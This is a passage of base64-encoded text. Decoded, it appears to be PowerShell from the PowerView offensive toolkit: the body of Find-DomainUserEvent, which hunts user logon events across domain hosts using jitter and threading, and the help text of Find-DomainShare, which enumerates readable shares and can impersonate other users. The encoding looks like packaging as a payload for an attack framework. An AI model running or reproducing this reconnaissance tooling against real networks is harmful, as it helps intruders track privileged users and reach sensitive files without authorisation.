pZGF0ZVJhbmdlKDAuMCwgMS4wKV0KICAgICAgICBbRG91YmxlXQogICAgICAgICRKaXR0ZXIgPSAuMywKCiAgICAgICAgW0ludF0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDApXQogICAgICAgICRUaHJlYWRzID0gMjAKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFVzZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdzYW1hY2NvdW50bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlcklkZW50aXR5J10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRVc2VySWRlbnRpdHkgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJEb21haW4nXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRVc2VyRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyTERBUEZpbHRlciddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRVc2VyTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlclNlYXJjaEJhc2UnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkVXNlclNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJBZG1pbkNvdW50J10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snQWRtaW5Db3VudCddID0gJFVzZXJBZG1pbkNvdW50IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlcklkZW50aXR5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckxEQVBGaWx0ZXInXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyU2VhcmNoQmFzZSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJBZG1pbkNvdW50J10pIHsKICAgICAgICAgICAgJFRhcmdldFVzZXJzID0gR2V0LURvbWFpblVzZXIgQFVzZXJTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IHNhbWFjY291bnRuYW1lCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyR3JvdXBJZGVudGl0eSddIC1vciAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbHRlciddKSkgewogICAgICAgICAgICAjIG90aGVyd2lzZSB3ZSdyZSBxdWVyeWluZyBhIHNwZWNpZmljIGdyb3VwCiAgICAgICAgICAgICRHcm91cFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICdJZGVudGl0eScgPSAkVXNlckdyb3VwSWRlbnRpdHkKICAgICAgICAgICAgICAgICdSZWN1cnNlJyA9ICRUcnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiVXNlckdyb3VwSWRlbnRpdHk6ICRVc2VyR3JvdXBJZGVudGl0eSIKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckRvbWFpbiddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRVc2VyRG9tYWluIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlclNlYXJjaEJhc2UnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFVzZXJTZWFyY2hCYXNlIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgJFRhcmdldFVzZXJzID0gR2V0LURvbWFpbkdyb3VwTWVtYmVyIEBHcm91cFNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgTWVtYmVyTmFtZQogICAgICAgIH0KCiAgICAgICAgIyBidWlsZCB0aGUgc2V0IG9mIGNvbXB1dGVycyB0byBlbnVtZXJhdGUKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck5hbWUnXSkgewogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gJENvbXB1dGVyTmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgIyBpZiBub3QgLUNvbXB1dGVyTmFtZSBpcyBwYXNzZWQsIHF1ZXJ5IHRoZSBjdXJyZW50IChvciB0YXJnZXQpIGRvbWFpbiBmb3IgZG9tYWluIGNvbnRyb2xsZXJzCiAgICAgICAgICAgICREQ1NlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICdMREFQJyA9ICRUcnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJERDU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICREQ1NlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJERDU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckV2ZW50XSBRdWVyeWluZyBmb3IgZG9tYWluIGNvbnRyb2xsZXJzIGluIGRvbWFpbjogJERvbWFpbiIKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEdldC1Eb21haW5Db250cm9sbGVyIEBEQ1NlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgZG5zaG9zdG5hbWUKICAgICAgICB9CiAgICAgICAgaWYgKCRUYXJnZXRDb21wdXRlcnMgLWFuZCAoJFRhcmdldENvbXB1dGVycyAtaXNub3QgW1N5c3RlbS5BcnJheV0pKSB7CiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSBAKCwkVGFyZ2V0Q29tcHV0ZXJzKQogICAgICAgIH0KICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyRXZlbnRdIFRhcmdldENvbXB1dGVycyBsZW5ndGg6ICQoJFRhcmdldENvbXB1dGVycy5MZW5ndGgpIgogICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJFdmVudF0gVGFyZ2V0Q29tcHV0ZXJzICRUYXJnZXRDb21wdXRlcnMiCiAgICAgICAgaWYgKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoIC1lcSAwKSB7CiAgICAgICAgICAgIHRocm93ICdbRmluZC1Eb21haW5Vc2VyRXZlbnRdIE5vIGhvc3RzIGZvdW5kIHRvIGVudW1lcmF0ZScKICAgICAgICB9CgogICAgICAgICMgdGhlIGhvc3QgZW51bWVyYXRpb24gYmxvY2sgd2UncmUgdXNpbmcgdG8gZW51bWVyYXRlIGFsbCBzZXJ2ZXJzCiAgICAgICAgJEhvc3RFbnVtQmxvY2sgPSB7CiAgICAgICAgICAgIFBhcmFtKCRDb21wdXRlck5hbWUsICRTdGFydFRpbWUsICRFbmRUaW1lLCAkTWF4RXZlbnRzLCAkVGFyZ2V0VXNlcnMsICRGaWx0ZXIsICRDcmVkZW50aWFsKQoKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICRVcCA9IFRlc3QtQ29ubmVjdGlvbiAtQ291bnQgMSAtUXVpZXQgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgIGlmICgkVXApIHsKICAgICAgICAgICAgICAgICAgICAkRG9tYWluVXNlckV2ZW50QXJncyA9IEB7CiAgICAgICAgICAgICAgICAgICAgICAgICdDb21wdXRlck5hbWUnID0gJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkU3RhcnRUaW1lKSB7ICREb21haW5Vc2VyRXZlbnRBcmdzWydTdGFydFRpbWUnXSA9ICRTdGFydFRpbWUgfQogICAgICAgICAgICAgICAgICAgIGlmICgkRW5kVGltZSkgeyAkRG9tYWluVXNlckV2ZW50QXJnc1snRW5kVGltZSddID0gJEVuZFRpbWUgfQogICAgICAgICAgICAgICAgICAgIGlmICgkTWF4RXZlbnRzKSB7ICREb21haW5Vc2VyRXZlbnRBcmdzWydNYXhFdmVudHMnXSA9ICRNYXhFdmVudHMgfQogICAgICAgICAgICAgICAgICAgIGlmICgkQ3JlZGVudGlhbCkgeyAkRG9tYWluVXNlckV2ZW50QXJnc1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICAgICAgICAgIGlmICgkRmlsdGVyIC1vciAkVGFyZ2V0VXNlcnMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRUYXJnZXRVc2VycykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgR2V0LURvbWFpblVzZXJFdmVudCBARG9tYWluVXNlckV2ZW50QXJncyB8IFdoZXJlLU9iamVjdCB7JFRhcmdldFVzZXJzIC1jb250YWlucyAkXy5UYXJnZXRVc2VyTmFtZX0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPcGVyYXRvciA9ICdvcicKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGaWx0ZXIuS2V5cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRfIC1lcSAnT3AnKSAtb3IgKCRfIC1lcSAnT3BlcmF0b3InKSAtb3IgKCRfIC1lcSAnT3BlcmF0aW9uJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgkRmlsdGVyWyRfXSAtbWF0Y2ggJyYnKSAtb3IgKCRGaWx0ZXJbJF9dIC1lcSAnYW5kJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPcGVyYXRvciA9ICdhbmQnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkS2V5cyA9ICRGaWx0ZXIuS2V5cyB8IFdoZXJlLU9iamVjdCB7KCRfIC1uZSAnT3AnKSAtYW5kICgkXyAtbmUgJ09wZXJhdG9yJykgLWFuZCAoJF8gLW5lICdPcGVyYXRpb24nKX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdldC1Eb21haW5Vc2VyRXZlbnQgQERvbWFpblVzZXJFdmVudEFyZ3MgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRPcGVyYXRvciAtZXEgJ29yJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkS2V5IGluICRLZXlzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8uIiRLZXkiIC1tYXRjaCAkRmlsdGVyWyRLZXldKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBhbmQgYWxsIGNsYXVzZXMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJEtleSBpbiAkS2V5cykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLiIkS2V5IiAtbm90bWF0Y2ggJEZpbHRlclskS2V5XSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBHZXQtRG9tYWluVXNlckV2ZW50IEBEb21haW5Vc2VyRXZlbnRBcmdzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgICMgb25seSBpZ25vcmUgdGhyZWFkaW5nIGlmIC1EZWxheSBpcyBwYXNzZWQKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWxheSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1N0b3BPblN1Y2Nlc3MnXSkgewoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckV2ZW50XSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6ICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJFdmVudF0gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVyIgogICAgICAgICAgICAkQ291bnRlciA9IDAKICAgICAgICAgICAgJFJhbmRObyA9IE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbQoKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRUYXJnZXRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgICRDb3VudGVyID0gJENvdW50ZXIgKyAxCgogICAgICAgICAgICAgICAgIyBzbGVlcCBmb3Igb3VyIHNlbWktcmFuZG9taXplZCBpbnRlcnZhbAogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQoKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJFdmVudF0gRW51bWVyYXRpbmcgc2VydmVyICRUYXJnZXRDb21wdXRlciAoJENvdW50ZXIgb2YgJCgkVGFyZ2V0Q29tcHV0ZXJzLmNvdW50KSkiCiAgICAgICAgICAgICAgICAkUmVzdWx0ID0gSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1Bcmd1bWVudExpc3QgJFRhcmdldENvbXB1dGVyLCAkU3RhcnRUaW1lLCAkRW5kVGltZSwgJE1heEV2ZW50cywgJFRhcmdldFVzZXJzLCAkRmlsdGVyLCAkQ3JlZGVudGlhbAogICAgICAgICAgICAgICAgJFJlc3VsdAoKICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0IC1hbmQgJFN0b3BPblN1Y2Nlc3MpIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyRXZlbnRdIFRhcmdldCB1c2VyIGZvdW5kLCByZXR1cm5pbmcgZWFybHkiCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJFdmVudF0gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHMiCgogICAgICAgICAgICAjIGlmIHdlJ3JlIHVzaW5nIHRocmVhZGluZywga2ljayBvZmYgdGhlIHNjcmlwdCBibG9jayB3aXRoIE5ldy1UaHJlYWRlZEZ1bmN0aW9uCiAgICAgICAgICAgICRTY3JpcHRQYXJhbXMgPSBAewogICAgICAgICAgICAgICAgJ1N0YXJ0VGltZScgPSAkU3RhcnRUaW1lCiAgICAgICAgICAgICAgICAnRW5kVGltZScgPSAkRW5kVGltZQogICAgICAgICAgICAgICAgJ01heEV2ZW50cycgPSAkTWF4RXZlbnRzCiAgICAgICAgICAgICAgICAnVGFyZ2V0VXNlcnMnID0gJFRhcmdldFVzZXJzCiAgICAgICAgICAgICAgICAnRmlsdGVyJyA9ICRGaWx0ZXIKICAgICAgICAgICAgICAgICdDcmVkZW50aWFsJyA9ICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgaWYgd2UncmUgdXNpbmcgdGhyZWFkaW5nLCBraWNrIG9mZiB0aGUgc2NyaXB0IGJsb2NrIHdpdGggTmV3LVRocmVhZGVkRnVuY3Rpb24gdXNpbmcgdGhlICRIb3N0RW51bUJsb2NrICsgcGFyYW1zCiAgICAgICAgICAgIE5ldy1UaHJlYWRlZEZ1bmN0aW9uIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVycyAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLVNjcmlwdFBhcmFtZXRlcnMgJFNjcmlwdFBhcmFtcyAtVGhyZWFkcyAkVGhyZWFkcwogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEZpbmQtRG9tYWluU2hhcmUgewo8IwouU1lOT1BTSVMKClNlYXJjaGVzIGZvciBjb21wdXRlciBzaGFyZXMgb24gdGhlIGRvbWFpbi4gSWYgLUNoZWNrU2hhcmVBY2Nlc3MgaXMgcGFzc2VkLAp0aGVuIG9ubHkgc2hhcmVzIHRoZSBjdXJyZW50IHVzZXIgaGFzIHJlYWQgYWNjZXNzIHRvIGFyZSByZXR1cm5lZC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbkNvbXB1dGVyLCBJbnZva2UtVXNlckltcGVyc29uYXRpb24sIEludm9rZS1SZXZlcnRUb1NlbGYsIEdldC1OZXRTaGFyZSwgTmV3LVRocmVhZGVkRnVuY3Rpb24gIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIGVudW1lcmF0ZXMgYWxsIG1hY2hpbmVzIG9uIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbgp1c2luZyBHZXQtRG9tYWluQ29tcHV0ZXIsIGFuZCBlbnVtZXJhdGVzIHRoZSBhdmFpbGFibGUgc2hhcmVzIGZvciBlYWNoCm1hY2hpbmUgd2l0aCBHZXQtTmV0U2hhcmUuIElmIC1DaGVja1NoYXJlQWNjZXNzIGlzIHBhc3NlZCwgdGhlbgpbSU8uRGlyZWN0b3J5XTo6R2V0RmlsZXMoKSBpcyB1c2VkIHRvIGNoZWNrIGlmIHRoZSBjdXJyZW50IHVzZXIgaGFzIHJlYWQKYWNjZXNzIHRvIHRoZSBnaXZlbiBzaGFyZS4gSWYgLUNyZWRlbnRpYWwgaXMgcGFzc2VkLCB0aGVuCkludm9rZS1Vc2VySW1wZXJzb25hdGlvbiBpcyB1c2VkIHRvIGltcGVyc29uYXRlIHRoZSBzcGVjaWZpZWQgdXNlciBiZWZvcmUKZW51bWVyYXRpb24sIHJldmVydGluZyBhZnRlciB3aXRoIEludm9rZS1SZXZlcnRUb1NlbGYuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIGFuIGFycmF5IG9mIG9uZSBvciBtb3JlIGhvc3RzIHRvIGVudW1lcmF0ZSwgcGFzc2FibGUgb24gdGhlIHBpcGVsaW5lLgpJZiAtQ29tcHV0ZXJOYW1lIGlzIG5vdCBwYXNzZWQsIHRoZSBkZWZhdWx0IGJlaGF2aW9yIGlzIHRvIGVudW1lcmF0ZSBhbGwgbWFjaGluZXMKaW4gdGhlIGRvbWFpbiByZXR1cm5lZCBieSBHZXQtRG9tYWluQ29tcHV0ZXIuCgouUEFSQU1FVEVSIENvbXB1dGVyRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byBxdWVyeSBmb3IgY29tcHV0ZXJzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENvbXB1dGVyTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBzZWFyY2ggZm9yIGNvbXB1dGVyIG9iamVjdHMuCgouUEFSQU1FVEVSIENvbXB1dGVyU2VhcmNoQmFzZQoKU3BlY2lmaWVzIHRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCBmb3IgY29tcHV0ZXJzLAplLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiLiBVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIENvbXB1dGVyT3BlcmF0aW5nU3lzdGVtCgpTZWFyY2ggY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBvcGVyYXRpbmcgc3lzdGVtLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIENvbXB1dGVyU2VydmljZVBhY2sKClNlYXJjaCBjb21wdXRlcnMgd2l0aCBhIHNwZWNpZmljIHNlcnZpY2UgcGFjaywgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBDb21wdXRlclNpdGVOYW1lCgpTZWFyY2ggY29tcHV0ZXJzIGluIHRoZSBzcGVjaWZpYyBBRCBTaXRlIG5hbWUsIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgQ2hlY2tTaGFyZUFjY2VzcwoKU3dpdGNoLiBPbmx5IGRpc3BsYXkgZm91bmQgc2hhcmVzIHRoYXQgdGhlIGxvY2FsIHVzZXIgaGFzIGFjY2VzcyB0by4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIgZm9yIGNvbXB1dGVycywgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbiBhbmQgdGFyZ2V0IHN5c3RlbXMuCgouUEFSQU1FVEVSIERlbGF5CgpTcGVjaWZpZXMgdGhlIGRlbGF5IChpbiBzZWNvbmRzKSBiZXR3ZWVuIGVudW1lcmF0aW5nIGhvc3RzLCBkZWZhdWx0cyB0byAwLgoKLlBBUkFNRVRFUiBKaXR0ZXIKClNwZWNpZmllcyB0aGUgaml0dGVyICgwLTEuMCkgdG8gYXBwbHkgdG8gYW55IHNwZWNpZmllZCAtRGVsYXksIGRlZmF1bHRzIHRvICsvLSAwLjMKCi5QQVJBTUVURVIgVGhyZWFkcwoKVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBmb3IgdXNlciBzZWFyY2hpbmcsIGRlZmF1bHRzIHRvIDIwLgoKLkVYQU1QTEUKCkZpbmQtRG9tYWluU2hhcmUKCkZpbmQgYWxsIGRvbWFpbiBzaGFyZXMgaW4gdGhlIGN1cnJlbnQgZG9tYWluLgoKLkVYQU1QTEUKCkZpbmQtRG9tYWluU2hhcmUgLUNoZWNrU2hhcmVBY2Nlc3MKCkZpbmQgYWxsIGRvbWFpbiBzaGFyZXMgaW4gdGhlIGN1cnJlbnQgZG9tYWluIHRoYXQgdGhlIGN1cnJlbnQgdXNlciBoYXMKcmVhZCBhY2Nlc3MgdG8uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV